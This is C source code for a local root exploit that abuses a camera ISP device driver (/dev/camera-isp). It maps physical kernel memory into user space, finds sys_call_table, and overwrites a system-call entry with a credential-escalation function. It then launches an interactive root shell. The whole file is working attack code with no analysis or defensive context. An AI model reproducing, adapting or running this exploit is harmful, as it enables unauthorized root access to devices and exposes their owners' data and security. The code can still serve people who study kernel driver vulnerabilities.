#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

#define DEV "/dev/camera-isp"
#define PHY_START   0x80000000
#define KERNEL_PHY_ADDR   1
#define KERNEL_OFFSET     0x10000000
#define MMAP_START        0x20000000
#define KERNEL_START      0xc0000000

extern unsigned long lookup_sym(const char *name);
int (*my_printk)(const char *fmt, ...) = 0;
extern int root_by_commit_cred();
extern int root_by_set_cred();
extern int test();

int read_value_at_address(unsigned long addr, unsigned long *val, unsigned size)
{
        union data{
                unsigned char ch[4];
                unsigned long l;
                unsigned short s[2];
        }ret;

        int off = addr & 0x3;

        addr &= ~0x3;
        
        if (!KERNEL_PHY_ADDR)
                ret.l = *(unsigned long*)addr;
        else {
                addr = MMAP_START +
                        (addr - KERNEL_START + PHY_START) - KERNEL_OFFSET;
                //printf("read addr: %p\n", addr);
                ret.l = *(unsigned long*)addr;
        }

        if (size == 4)
                *val = ret.l;
        else if (size == 2)
                *val = ret.s[off / 2];
        else
                *val = ret.ch[off];

        return 0;
}

int write_value_at_address(unsigned long addr, unsigned long val, unsigned size)
{
        addr = MMAP_START + (addr - KERNEL_START + PHY_START) - KERNEL_OFFSET;
        
        if (size == 4)
                *(unsigned long*)addr = val;
        else
                return -1;
        
        return 0;
}

int main() {

        int fd;
        unsigned addr;
        unsigned long ret;
        unsigned long *tgt;

        fd = open(DEV, O_RDWR);
        if (fd < 0) {
                printf("can not open %s: %s!\n", DEV, strerror(errno));
                return -1;
        }

        addr = mmap(MMAP_START, 0x80000000, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_FIXED, fd, KERNEL_OFFSET);

        if (addr != 0x20000000) {
                printf("mmap failed: %s!\n", strerror(errno));
                return -1;
        }

        my_printk = lookup_sym("printk");
        if (my_printk) 
                printf("find printk addr: %p\n", my_printk);

        tgt = lookup_sym("sys_call_table");
        if (!tgt) {
                printf("can not find sys_call_table addr!\n");
                return 0;
        }
        printf("sys_call_table addr: %p\n", tgt);
        tgt += 0x10f;
        write_value_at_address(tgt, test, 4);
        ret = syscall(0x10f, 0, 0, 0);
        if (ret != 123) {
                printf("modify sys_call error!\n");
                return 0;
        }
        
        write_value_at_address(tgt, root_by_set_cred, 4);
        sleep(1);
        ret = syscall(0x10f, 0, 0, 0);
        printf("ret = %d\n", ret);
        
        if (getuid() == 0) 
                system("/system/bin/sh -i");
        else {
                printf("root failed!\n");
        }
        
        //munmap(MMAP_START, 0x80000000);
        return 0;
}
